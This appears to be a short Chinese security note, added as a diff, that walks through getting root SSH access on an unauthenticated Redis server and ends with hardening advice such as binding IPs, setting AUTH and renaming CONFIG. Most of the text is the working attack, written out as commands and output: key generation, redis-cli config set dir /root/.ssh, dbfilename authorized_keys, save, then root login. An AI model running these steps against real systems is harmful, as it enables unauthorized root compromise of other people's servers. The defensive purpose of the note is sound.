@@ -1,0 +1,28 @@
+生成密钥
+$ssh-keygen –t rsa
+$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
+
+设置到远程
+$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+$ redis-cli -h 192.168.1.11
+$ 192.168.1.11:6379> config set dir /root/.ssh/
+OK
+$ 192.168.1.11:6379> config get dir
+1) "dir"
+2) "/root/.ssh"
+$ 192.168.1.11:6379> config set dbfilename "authorized_keys"
+OK
+$ 192.168.1.11:6379> save
+OK
+
+
+
+登录
+$ ssh –i  id_rsa root@192.168.1.11
+
+
+redis建议
+配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口6379
+配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中
+配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度
+好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config
